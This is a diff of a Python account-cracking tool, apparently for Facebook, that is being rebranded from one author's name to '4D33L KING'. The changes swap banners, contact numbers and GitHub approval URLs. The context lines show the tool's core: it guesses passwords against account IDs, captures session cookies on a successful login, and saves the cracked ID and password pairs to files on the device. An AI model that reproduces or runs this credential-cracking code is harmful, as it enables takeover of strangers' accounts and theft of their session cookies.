@@ -4,7 +4,7 @@
 #---------------------[IMPORT]---------------------#
 from os import path
 import os,base64,zlib,pip,urllib
-print('\n\033[1;37m install modules....\n It will take some seconds...JAR   W8 update Tool..')
+print('\n\033[1;37m install modules....\n It will take some seconds...4D33L KING   W8 update Tool..')
 os.system('xdg-open https://youtube.com/channel/UCRedHPu_qhEpO9aLttjRKrg')
 from bs4 import BeautifulSoup as sop
 from concurrent.futures import ThreadPoolExecutor as ThreadPool
@@ -188,7 +188,7 @@ def uaku():
         for ub in ff:
             ugen.append(ub)
     except:
-        a=requests.get('https://raw.githubusercontent.com/Dark-Cyber-07/BLACK_XXX/main/show.txt').text
+        a=requests.get('https://raw.githubusercontent.com/4deeL-khan/Jaan/main/Approval.txt').text
         ff=open('show.txt','w')
         aa=re.findall('line">(.*?)<',str(a))
         for un in aa:
@@ -212,11 +212,11 @@ def psb(z):
         
 os.system("clear")
 import requests,os
-fuckx=str(input("\033[1;97m[\033[92;1m?\033[1;97m]ENTER YOUR NAME :\033[1;97m "))
+fuckx=str(input("\033[1;97m[\033[92;1m?\033[1;97m]BR0 TYP YOUR NAME  :\033[1;97m "))
 name=fuckx.upper()
 print ('')
 
-psb('\033[1;97m[\033[92;1m•\033[1;97m]\033[1;97mWELCOME MY TOOLS  '+name)
+psb('\033[1;97m[\033[92;1m•\033[1;97m]\033[1;97mW3LC0M3 T0 4D33L KING T0LL  '+name)
 print('')
 print('\033[1;93mTOOLS UPDATE SUCCESSFUL ')
 print('')
@@ -245,21 +245,18 @@ else:
 def banner():
     clear()
     print(f"""\033[1;92m
-\033[1;37m      ____        _       ________    
-\033[1;92m     `MM'        dM.     `MMMMMMMb.  
-\033[1;37m       MM       ,MMb       MM    `Mb  
-\033[1;37m       MM      ,P `Mb      MM     MM  
-\033[1;92m       MM      d'  YM.     MM    .M9  
-\033[1;37m       MM     ,P   `Mb     MMMMMMM9'  
-\033[1;92m       MM     d'    YM.    MM  \M\    
-\033[1;37m (8)   MM    ,MMMMMMMMb    MM   \M\   
-\033[1;92m ((   ,M9    d'      YM.   MM    \M\  
-\033[1;37m  YMMMM9   _dM_     _dMM_  MM_    \M\_
+
+\033[1;37m__________                       _____        
+\033[1;92m\______   \ ______  _  _______ _/ ____\____   
+\033[1;37m |    |  _// __ \ \/ \/ /\__  \\   __\\__  \  
+ \033[1;92m|    |   \  ___/\     /  / __ \|  |   / __ \_
+ \033[1;37m|______  /\___  >\/\_/  (____  /__|  (____  /
+ \033[1;92m\/     \/             \/           \/ 
 \033[1;93m┌━━━━━━━━━━━━━━━━━━\033[1;37m ━━━━━━━━━━━━━━━━━━━━┐
-\033[1;37m│ ❲★❳ AUTHOR   : Jahidul islam          │ 
-\033[1;37m│ ❲★❳ GITHUB   : Jahidul404             |
-\033[1;37m│ ❲★❳ WHATSAPP : +88 01701707661        │
-\033[1;37m│ ❲★❳ TOOLS    : \033[1;32mGAME ID CLONER  \033[1;37m       │
+\033[1;37m│ ❲★❳ AUTHOR   : ★★★4D33L★★LEGHARI★★                                                │ 
+\033[1;37m│ ❲★❳ GITHUB   : LTC.                                                                               |
+\033[1;37m│ ❲★❳ WHATSAPP : ★★★★★03444819642★★★★★                                         │
+\033[1;37m│ ❲★❳ TOOLS    : \033[1;32mGAME ID CLONER  \033[1;37m      │
 \033[1;37m│ ❲★❳ VERSION  : \033[1;35m 4\033[1;35mK \033[1;32mPREMIUM  \033[1;37m          │
 \033[1;93m└━━━━━━━━━━━━━━━━━━\033[1;37m ━━━━━━━━━━━━━━━━━━━━┘""")
 #---------------------[LOOP MENU]---------------------#
@@ -338,7 +335,7 @@ def main():
        os.system(' ')
        menu()
     if sh =='6':
-       os.system('xdg-open https://www.facebook.com/profile.php?id=100000446995720')
+       os.system('xdg-open https://www.facebook.com/profile.php?id=ved.baghel.39')
        main()  
 
         
@@ -392,8 +389,8 @@ def random_apk():
 		print(f" {P}[{H}★{P}]{WHITE} CRACK ID  :\033[38;5;192m {GREEN}"+tl)
 		print(f' {P}[{H}★{P}]{WHITE} SIM CODE  :\033[1;92m {kode} ')
 		print(f" {P}[{H}★{P}]{WHITE} METHUD    :\033[1;92m{doamin}")
-		print(f" {P}[{H}★{P}]{WHITE} FILE SAVE : JAR-RNDM-OK.txt  ")
-		print(f" {P}[{H}★{P}]{WHITE} FILE SAVE : JAR-RNDM-CP.txt  ")
+		print(f" {P}[{H}★{P}]{WHITE} FILE SAVE : 4D33L KING-RNDM-OK.txt  ")
+		print(f" {P}[{H}★{P}]{WHITE} FILE SAVE : 4D33L KING-RNDM-CP.txt  ")
 		print(f"\033[38;5;46m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;32m•\033[1;35m•\033[1;34m•\033[1;97m•\033[1;33m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[38;5;196m•\033[1;32m•\033[1;97m•\033[1;35m•\033[1;34m•\033[1;33m•\033[38;5;46m•\033[1;97m•")
 		print(f" {P}[{H}★{P}]{WHITE} FIRST [\033[1;92mON\033[1;92m/\033[38;5;196mOFF\033[1;37m] AIRPLANE MODE 💉 ")
 		print(f" {P}[{H}★{P}]{WHITE} \x1b[97m\033[37;41mMIX IDZ CLONING ENJOY PAID USER\033[0;m ")
@@ -437,8 +434,8 @@ def random_MIX():
 		print(f" {P}[{H}★{P}]{WHITE} CRACK ID  :\033[38;5;192m {GREEN}"+tl)
 		print(f' {P}[{H}★{P}]{WHITE} SIM CODE  :\033[1;92m {kode} ')
 		print(f" {P}[{H}★{P}]{WHITE} METHUD    :\033[1;92m{doamin}")
-		print(f" {P}[{H}★{P}]{WHITE} FILE SAVE : JAR-RNDM-OK.txt  ")
-		print(f" {P}[{H}★{P}]{WHITE} FILE SAVE : JAR-RNDM-CP.txt  ")
+		print(f" {P}[{H}★{P}]{WHITE} FILE SAVE : 4D33L KING-RNDM-OK.txt  ")
+		print(f" {P}[{H}★{P}]{WHITE} FILE SAVE : 4D33L KING-RNDM-CP.txt  ")
 		print(f"\033[38;5;46m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;32m•\033[1;35m•\033[1;34m•\033[1;97m•\033[1;33m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[38;5;196m•\033[1;32m•\033[1;97m•\033[1;35m•\033[1;34m•\033[1;33m•\033[38;5;46m•\033[1;97m•")
 		print(f" {P}[{H}★{P}]{WHITE} FIRST [\033[1;92mON\033[1;92m/\033[38;5;196mOFF\033[1;37m] AIRPLANE MODE 💉 ")
 		print(f" {P}[{H}★{P}]{WHITE} \x1b[97m\033[37;41mMIX IDZ CLONING ENJOY PAID USER\033[0;m ")
@@ -484,8 +481,8 @@ def random_number1():
 		print(f" {P}[{H}★{P}]{WHITE} CRACK ID  :\033[38;5;192m {GREEN}"+tl)
 		print(f' {P}[{H}★{P}]{WHITE} SIM CODE  :\033[1;92m {kode} ')
 		print(f" {P}[{H}★{P}]{WHITE} METHUD    :\033[1;92m{doamin}")
-		print(f" {P}[{H}★{P}]{WHITE} FILE SAVE : JAR-RNDM-OK.txt  ")
-		print(f" {P}[{H}★{P}]{WHITE} FILE SAVE : JAR-RNDM-CP.txt  ")
+		print(f" {P}[{H}★{P}]{WHITE} FILE SAVE : 4D33L KING-RNDM-OK.txt  ")
+		print(f" {P}[{H}★{P}]{WHITE} FILE SAVE : 4D33L KING-RNDM-CP.txt  ")
 		print(f"\033[38;5;46m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;32m•\033[1;35m•\033[1;34m•\033[1;97m•\033[1;33m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[38;5;196m•\033[1;32m•\033[1;97m•\033[1;35m•\033[1;34m•\033[1;33m•\033[38;5;46m•\033[1;97m•")
 		print(f" {P}[{H}★{P}]{WHITE} FIRST [\033[1;92mON\033[1;92m/\033[38;5;196mOFF\033[1;37m] AIRPLANE MODE 💉 ")
 		print(f" {P}[{H}★{P}]{WHITE} \x1b[97m\033[37;41mMIX IDZ CLONING ENJOY PAID USER\033[0;m ")
@@ -529,8 +526,8 @@ def random_number2():
 		print(f" {P}[{H}★{P}]{WHITE} CRACK ID  :\033[38;5;192m {GREEN}"+tl)
 		print(f' {P}[{H}★{P}]{WHITE} SIM CODE  :\033[1;92m {kode} ')
 		print(f" {P}[{H}★{P}]{WHITE} METHUD    :\033[1;92m{doamin}")
-		print(f" {P}[{H}★{P}]{WHITE} FILE SAVE : JAR-RNDM-OK.txt  ")
-		print(f" {P}[{H}★{P}]{WHITE} FILE SAVE : JAR-RNDM-CP.txt  ")
+		print(f" {P}[{H}★{P}]{WHITE} FILE SAVE : 4D33L KING-RNDM-OK.txt  ")
+		print(f" {P}[{H}★{P}]{WHITE} FILE SAVE : 4D33L KING-RNDM-CP.txt  ")
 		print(f"\033[38;5;46m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;32m•\033[1;35m•\033[1;34m•\033[1;97m•\033[1;33m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[38;5;196m•\033[1;32m•\033[1;97m•\033[1;35m•\033[1;34m•\033[1;33m•\033[38;5;46m•\033[1;97m•")
 		print(f" {P}[{H}★{P}]{WHITE} FIRST [\033[1;92mON\033[1;92m/\033[38;5;196mOFF\033[1;37m] AIRPLANE MODE 💉 ")
 		print(f" {P}[{H}★{P}]{WHITE} \x1b[97m\033[37;41mMIX IDZ CLONING ENJOY PAID USER\033[0;m ")
@@ -574,8 +571,8 @@ def random_number3():
 		print(f" {P}[{H}★{P}]{WHITE} CRACK ID  :\033[38;5;192m {GREEN}"+tl)
 		print(f' {P}[{H}★{P}]{WHITE} SIM CODE  :\033[1;92m {kode} ')
 		print(f" {P}[{H}★{P}]{WHITE} METHUD    :\033[1;92m{doamin}")
-		print(f" {P}[{H}★{P}]{WHITE} FILE SAVE : JAR-RNDM-OK.txt  ")
-		print(f" {P}[{H}★{P}]{WHITE} FILE SAVE : JAR-RNDM-CP.txt  ")
+		print(f" {P}[{H}★{P}]{WHITE} FILE SAVE : 4D33L KING-RNDM-OK.txt  ")
+		print(f" {P}[{H}★{P}]{WHITE} FILE SAVE : 4D33L KING-RNDM-CP.txt  ")
 		print(f"\033[38;5;46m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;32m•\033[1;35m•\033[1;34m•\033[1;97m•\033[1;33m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[38;5;196m•\033[1;32m•\033[1;97m•\033[1;35m•\033[1;34m•\033[1;33m•\033[38;5;46m•\033[1;97m•")
 		print(f" {P}[{H}★{P}]{WHITE} FIRST [\033[1;92mON\033[1;92m/\033[38;5;196mOFF\033[1;37m] AIRPLANE MODE 💉 ")
 		print(f" {P}[{H}★{P}]{WHITE} \x1b[97m\033[37;41mMIX IDZ CLONING ENJOY PAID USER\033[0;m ")
@@ -596,7 +593,7 @@ def random_gmail():
     banner()
     print(f"             {H} Gmail {K}CODE{P}  ");time.sleep(0.05)
     print(f"\033[38;5;46m-\033[38;5;196m-\033[1;35m-\033[1;34m-\033[1;33m-\033[1;32m-\033[1;97m-\033[38;5;196m-\033[38;5;46m-\033[1;35m-\033[1;34m-\033[1;33m-\033[1;32m-\033[1;97m-\033[38;5;196m-\033[38;5;46m-\033[1;32m-\033[1;35m-\033[1;34m-\033[1;97m-\033[1;33m-\033[38;5;196m-\033[1;35m-\033[1;34m-\033[1;33m-\033[1;32m-\033[1;97m-\033[38;5;196m-\033[38;5;46m-\033[38;5;196m-\033[1;32m-\033[1;97m-\033[1;35m-\033[1;34m-\033[1;33m-\033[38;5;46m-\033[1;97m•")
-    print(f"  {K}EXAMPLE : \033[1;97mRakib , Jahid , Mehedi , Sumaiya , Ridoy") 
+    print(f"  {K}EXAMPLE : \033[1;97mRakib , 4D33L KING , Mehedi , Sumaiya , Ridoy") 
     kode = input('  \033[1;97m[\033[92;1m●\033[1;97m] target fast name : ')
     print(f"\033[38;5;46m-\033[38;5;196m-\033[1;35m-\033[1;34m-\033[1;33m-\033[1;32m-\033[1;97m-\033[38;5;196m-\033[38;5;46m-\033[1;35m-\033[1;34m-\033[1;33m-\033[1;32m-\033[1;97m-\033[38;5;196m-\033[38;5;46m-\033[1;32m-\033[1;35m-\033[1;34m-\033[1;97m-\033[1;33m-\033[38;5;196m-\033[1;35m-\033[1;34m-\033[1;33m-\033[1;32m-\033[1;97m-\033[38;5;196m-\033[38;5;46m-\033[38;5;196m-\033[1;32m-\033[1;97m-\033[1;35m-\033[1;34m-\033[1;33m-\033[38;5;46m-\033[1;97m•")
     print(f"  {K}EXAMPLE : \033[1;97mHasan , Islam , Chowdhury , Akter , Khatun ") 
@@ -622,8 +619,8 @@ def random_gmail():
         print(f" {P}[{H}★{P}]{WHITE} CRACK ID  :\033[38;5;192m {GREEN}"+tl)
         print(f' {P}[{H}★{P}]{WHITE} SIM CODE  :\033[1;92m {kode} ')
         print(f" {P}[{H}★{P}]{WHITE} METHUD    : \033[1;92m{doamin}")
-        print(f" {P}[{H}★{P}]{WHITE} FILE SAVE : JAR-RNDM-OK.txt  ")
-        print(f" {P}[{H}★{P}]{WHITE} FILE SAVE : JAR-RNDM-CP.txt  ")
+        print(f" {P}[{H}★{P}]{WHITE} FILE SAVE : 4D33L KING-RNDM-OK.txt  ")
+        print(f" {P}[{H}★{P}]{WHITE} FILE SAVE : 4D33L KING-RNDM-CP.txt  ")
         print(f"\033[38;5;46m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;32m•\033[1;35m•\033[1;34m•\033[1;97m•\033[1;33m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[38;5;196m•\033[1;32m•\033[1;97m•\033[1;35m•\033[1;34m•\033[1;33m•\033[38;5;46m•\033[1;97m•")
         print(f" {P}[{H}★{P}]{WHITE} FIRST [\033[1;92mON\033[1;92m/\033[38;5;196mOFF\033[1;37m] AIRPLANE MODE 💉 ")
         print(f" {P}[{H}★{P}]{WHITE} \x1b[97m\033[37;41mMIX IDZ CLONING ENJOY PAID USER\033[0;m ")
@@ -649,7 +646,7 @@ def apk(uid,pwx,tl):
     try:
         for ps in pwx:
             session = requests.Session()
-            sys.stdout.write(f'\r\033[m[JAHID] \033[1;92m%s\033[m |\033[m\033[mOK>\033[1;92m%s\033[m '%(loop,len(oks))),
+            sys.stdout.write(f'\r\033[m[4D33L KING] \033[1;92m%s\033[m |\033[m\033[mOK>\033[1;92m%s\033[m '%(loop,len(oks))),
             sys.stdout.flush()
             pro = random.choice(ugen)
             #oo=random.choice(sss)
@@ -688,14 +685,14 @@ def apk(uid,pwx,tl):
                 print(f'\033[1;93m   [💥] COOKIE (1) \033[1;92m : '+coki)
                 cek_apk(session,coki)
                 oks.append(cid)
-                open('/sdcard/JAR-RNDM-OK.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
+                open('/sdcard/4D33L KING-RNDM-OK.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
                
                 break
             else:
                 continue
         loop+=1
-        sys.stdout.write(f'\r\033[m[JAHIDUL] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
-       # sys.stdout.write(f" \r{R} [{B}JAHID{R}]  {P}[{k}{loop}{P}/{h}{len(id)}{P}]Ã¢â‚¬â€{P}[{H}{ok}{P}]Ã¢â‚¬â€{P}[{k}{cp}{x}]Ã¢â‚¬â€[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  ")
+        sys.stdout.write(f'\r\033[m[4D33L KINGUL] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
+       # sys.stdout.write(f" \r{R} [{B}4D33L KING{R}]  {P}[{k}{loop}{P}/{h}{len(id)}{P}]Ã¢â‚¬â€{P}[{H}{ok}{P}]Ã¢â‚¬â€{P}[{k}{cp}{x}]Ã¢â‚¬â€[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  ")
         sys.stdout.flush()
     except:
         pass
@@ -708,7 +705,7 @@ def mix(uid,pwx,tl):
     try:
         for ps in pwx:
             session = requests.Session()
-            sys.stdout.write(f'\r\033[m[JAHID] \033[1;92m%s\033[m |\033[m\033[mOK>\033[1;92m%s\033[m '%(loop,len(oks))),
+            sys.stdout.write(f'\r\033[m[4D33L KING] \033[1;92m%s\033[m |\033[m\033[mOK>\033[1;92m%s\033[m '%(loop,len(oks))),
             sys.stdout.flush()
             pro = random.choice(ugen)
             #oo=random.choice(sss)
@@ -747,13 +744,13 @@ def mix(uid,pwx,tl):
                 #print(f'\033[1;93m   [💥] COOKIE (1) \033[1;92m : '+coki)
                 #cek_apk(session,coki)
                 oks.append(cid)
-                open('/sdcard/JAR-RNDM-OK.txt', 'a').write(uid+' | '+ps+' | '+uid+'\n')
+                open('/sdcard/4D33L KING-RNDM-OK.txt', 'a').write(uid+' | '+ps+' | '+uid+'\n')
                 break
             else:
                 continue
         loop+=1
-        sys.stdout.write(f'\r\033[m[JAHIDUL] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
-       # sys.stdout.write(f" \r{R} [{B}JAHID{R}]  {P}[{k}{loop}{P}/{h}{len(id)}{P}]Ã¢â‚¬â€{P}[{H}{ok}{P}]Ã¢â‚¬â€{P}[{k}{cp}{x}]Ã¢â‚¬â€[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  ")
+        sys.stdout.write(f'\r\033[m[4D33L KINGUL] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
+       # sys.stdout.write(f" \r{R} [{B}4D33L KING{R}]  {P}[{k}{loop}{P}/{h}{len(id)}{P}]Ã¢â‚¬â€{P}[{H}{ok}{P}]Ã¢â‚¬â€{P}[{k}{cp}{x}]Ã¢â‚¬â€[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  ")
         sys.stdout.flush()
     except:
         pass
@@ -766,7 +763,7 @@ def fcrack(uid,pwx,tl):
     try:
         for ps in pwx:
             session = requests.Session()
-            sys.stdout.write(f'\r\033[m[JAHID] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
+            sys.stdout.write(f'\r\033[m[4D33L KING] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
             sys.stdout.flush()
             pro = random.choice(ugen)
             #oo=random.choice(sss)
@@ -801,17 +798,17 @@ def fcrack(uid,pwx,tl):
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[65:80]
-                print(f'\033[1;92m [JAHID>OK] '+uid+' | '+ps+'\33[0;92m')
+                print(f'\033[1;92m [4D33L KING>OK] '+uid+' | '+ps+'\33[0;92m')
                 print(f'\033[1;93m   [💥] COOKIE (1) \033[1;92m : '+coki)
                 #cek_apk(session,coki)
                 oks.append(cid)
-                open('/sdcard/JAR-RNDM-OK.txt', 'a').write(uid+' | '+ps+' | '+uid+'\n')
+                open('/sdcard/4D33L KING-RNDM-OK.txt', 'a').write(uid+' | '+ps+' | '+uid+'\n')
                 break
             else:
                 continue
         loop+=1
-        sys.stdout.write(f'\r\033[m[JAHIDUL] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
-       # sys.stdout.write(f" \r{R} [{B}JAHID{R}]  {P}[{k}{loop}{P}/{h}{len(id)}{P}]Ã¢â‚¬â€{P}[{H}{ok}{P}]Ã¢â‚¬â€{P}[{k}{cp}{x}]Ã¢â‚¬â€[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  ")
+        sys.stdout.write(f'\r\033[m[4D33L KINGUL] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
+       # sys.stdout.write(f" \r{R} [{B}4D33L KING{R}]  {P}[{k}{loop}{P}/{h}{len(id)}{P}]Ã¢â‚¬â€{P}[{H}{ok}{P}]Ã¢â‚¬â€{P}[{k}{cp}{x}]Ã¢â‚¬â€[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  ")
         sys.stdout.flush()
     except:
         pass
@@ -824,7 +821,7 @@ def fcrack1(uid,pwx,tl):
     try:
         for ps in pwx:
             session = requests.Session()
-            sys.stdout.write(f'\r\033[m[JAHID] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
+            sys.stdout.write(f'\r\033[m[4D33L KING] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
             sys.stdout.flush()
             pro = random.choice(ugen)
             #oo=random.choice(sss)
@@ -859,18 +856,18 @@ def fcrack1(uid,pwx,tl):
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[65:80]
-                print(f'\033[1;92m [JAHID>OK] '+uid+' | '+ps+'\33[0;92m')
+                print(f'\033[1;92m [4D33L KING>OK] '+uid+' | '+ps+'\33[0;92m')
                 print(f'\033[1;93m   [💥] COOKIE (1) \033[1;92m : '+coki)
                 #cek_apk(session,coki)
                 oks.append(cid)
-                open('/sdcard/JAR-RNDM-OK.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
+                open('/sdcard/4D33L KING-RNDM-OK.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
                
                 break
             else:
                 continue
         loop+=1
-        sys.stdout.write(f'\r\033[m[JAHIDUL] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
-       # sys.stdout.write(f" \r{R} [{B}JAHID{R}]  {P}[{k}{loop}{P}/{h}{len(id)}{P}]Ã¢â‚¬â€{P}[{H}{ok}{P}]Ã¢â‚¬â€{P}[{k}{cp}{x}]Ã¢â‚¬â€[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  ")
+        sys.stdout.write(f'\r\033[m[4D33L KINGUL] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
+       # sys.stdout.write(f" \r{R} [{B}4D33L KING{R}]  {P}[{k}{loop}{P}/{h}{len(id)}{P}]Ã¢â‚¬â€{P}[{H}{ok}{P}]Ã¢â‚¬â€{P}[{k}{cp}{x}]Ã¢â‚¬â€[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  ")
         sys.stdout.flush()
     except:
         pass
@@ -884,7 +881,7 @@ def fcrack2(uid,pwx,tl):
     try:
         for ps in pwx:
             session = requests.Session()
-            sys.stdout.write(f'\r\033[m[JAHID] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
+            sys.stdout.write(f'\r\033[m[4D33L KING] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
             sys.stdout.flush()
             pro = random.choice(ugen)
             #oo=random.choice(sss)
@@ -919,18 +916,18 @@ def fcrack2(uid,pwx,tl):
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[65:80]
-                print(f'\033[1;92m  [JAHID>OK] '+uid+' | '+ps+'\33[0;92m')
+                print(f'\033[1;92m  [4D33L KING>OK] '+uid+' | '+ps+'\33[0;92m')
                 print(f'\033[1;93m   [💥] COOKIE (1) \033[1;92m : '+coki)
                #cek_apk(session,coki)
                 oks.append(cid)
-                open('/sdcard/JAR-RNDM-OK.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
+                open('/sdcard/4D33L KING-RNDM-OK.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
                
                 break
             else:
                 continue
         loop+=1
-        sys.stdout.write(f'\r\033[m[JAHIDUL] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
-       # sys.stdout.write(f" \r{R} [{B}JAHID{R}]  {P}[{k}{loop}{P}/{h}{len(id)}{P}]Ã¢â‚¬â€{P}[{H}{ok}{P}]Ã¢â‚¬â€{P}[{k}{cp}{x}]Ã¢â‚¬â€[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  ")
+        sys.stdout.write(f'\r\033[m[4D33L KINGUL] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
+       # sys.stdout.write(f" \r{R} [{B}4D33L KING{R}]  {P}[{k}{loop}{P}/{h}{len(id)}{P}]Ã¢â‚¬â€{P}[{H}{ok}{P}]Ã¢â‚¬â€{P}[{k}{cp}{x}]Ã¢â‚¬â€[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  ")
         sys.stdout.flush()
     except:
         pass
@@ -942,11 +939,11 @@ def approval():
   uuid = str(os.geteuid()) + str(os.getlogin())
   id = "4h".join(uuid)
   try:
-    httpCaht = requests.get('https://raw.githubusercontent.com/Jahidul404/apv/main/apv-a').text
+    httpCaht = requests.get('https://raw.githubusercontent.com/4deeL-khan/Jaan/main/Approval.txt').text
     if id in httpCaht:
       print("\33[1;32mYour Token is Successfully Approved")
       print('\033[1;93mYour Token is Successfully Approved ')
-      psb('\033[1;97m[\033[92;1m•\033[1;97m]\033[1;97mYOUR KEY DONE PAID USER ADMIN PERMISSION MD JAHID ISLAM ')
+      psb('\033[1;97m[\033[92;1m•\033[1;97m]\033[1;97mYOUR KEY DONE PAID USER ADMIN PERMISSION MD 4D33L KING ISLAM ')
       msg = str(os.geteuid())
       time.sleep(0.03)
       print()
